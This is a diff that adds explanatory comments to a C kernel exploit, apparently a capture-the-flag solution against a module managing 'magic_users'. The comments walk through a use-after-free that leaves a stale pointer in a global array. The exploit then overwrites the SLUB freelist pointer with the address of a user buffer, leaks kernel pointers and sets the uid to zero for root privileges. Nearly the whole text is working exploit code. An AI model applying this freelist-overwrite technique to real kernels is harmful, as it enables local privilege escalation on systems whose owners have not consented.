@@ -44,12 +44,15 @@ int main(int argc, char** argv) {
   user_init(&c, "CCCCCCCC");
   user_init(&d, "DDDDDDDD");
 
+  // magic_users: a -> b -> c
   DO_ADD(a);
   DO_SWITCH1(a);
   DO_ADD(b);
   DO_SWITCH1(b);
   DO_ADD(c);
 
+  // magic_users: a -> c
+  // ptr still in global array
   DO_SWITCH0(a); 
   DO_DELETE(b);
   DO_ADD(b);
@@ -57,10 +60,12 @@ int main(int argc, char** argv) {
   DO_SWITCH0(c);
   memset(&c.pass, 'Z', 64);
 
+  // overwrite slub slot freelist ptr
   unsigned long buffer[24] = {0};
   ((unsigned long *)&c.pass)[2] = (unsigned long)&buffer;
   DO_EDIT(c);
 
+  // alloc more chunks to force chunk ptr
   DO_SWITCH0(a);
   DO_ADD(d);
   DO_ADD(c);
@@ -68,6 +73,7 @@ int main(int argc, char** argv) {
   for (int i = 0 ; i < 24; ++i)
     printf("%lx\n", buffer[i]);
 
+  // overwrite uid, win!
   buffer[0] = 0;
   DO_SWITCH0(c);
 
